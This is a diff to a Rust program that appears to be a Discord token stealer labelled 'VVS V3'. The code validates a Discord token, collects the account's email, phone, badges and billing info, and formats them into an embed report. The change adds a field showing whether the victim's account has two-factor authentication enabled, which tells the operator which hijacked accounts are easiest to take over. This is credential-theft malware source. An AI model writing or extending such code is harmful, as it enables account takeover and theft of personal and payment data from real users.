@@ -121,6 +121,7 @@ struct DdU {
     public_flags: u64,
     email: String,
     phone: String,
+    mfa_enabled: bool,
 }
 
 async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
@@ -140,6 +141,7 @@ async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
         let public_flags = json["public_flags"].as_u64().unwrap_or(0);
         let email = json["email"].as_str().unwrap_or("N/A").to_string();
         let phone = json["phone"].as_str().unwrap_or("N/A").to_string();
+        let mfa_enabled = json["mfa_enabled"].as_bool().unwrap_or(false);
 
         Some(DdU {
             id,
@@ -149,6 +151,7 @@ async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
             public_flags,
             email,
             phone,
+            mfa_enabled,
         })
     } else {
         None
@@ -426,6 +429,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                                         { "name": "<a:all_discord_badges_gif:1157698511320653924> Badges", "value": final_badges, "inline": false },
                                                                         { "name": "<a:dark_butterfly:1441101545465974935> Email", "value": format!("`{}`", user.email), "inline": false },
                                                                         { "name": "<a:dark_butterfly:1441101545465974935> Phone", "value": format!("`{}`", user.phone), "inline": false },
+                                                                        { "name": "<a:dark_butterfly:1441101545465974935> 2FA", "value": format!("`{}`", if user.mfa_enabled { "Enabled" } else { "Disabled" }), "inline": true },
                                                                         { "name": "<a:dark_butterfly:1441101545465974935> Billing Info", "value": format!("`{}`", billing_info), "inline": false }
                                                                     ],
                                                                     "footer": { "text": "VVS V3" },
